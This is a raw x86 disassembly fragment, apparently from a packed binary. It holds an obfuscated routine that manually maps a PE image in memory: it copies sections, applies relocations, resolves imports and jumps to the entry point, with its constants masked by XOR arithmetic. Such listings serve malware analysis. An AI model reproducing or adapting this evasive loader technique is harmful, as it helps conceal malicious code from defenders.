  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
